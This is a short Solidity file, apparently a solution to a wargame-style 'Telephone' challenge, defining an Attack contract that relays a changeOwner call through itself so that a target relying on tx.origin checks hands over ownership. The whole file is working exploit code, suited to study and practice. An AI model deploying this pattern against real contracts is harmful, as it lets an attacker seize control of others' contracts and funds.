// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address public owner;
    Telephone telephone;

    constructor(address _addr) {
        owner = msg.sender;
        telephone = Telephone(_addr);
    }

    function changeOwner() external {
        telephone.changeOwner(msg.sender);
    }
}
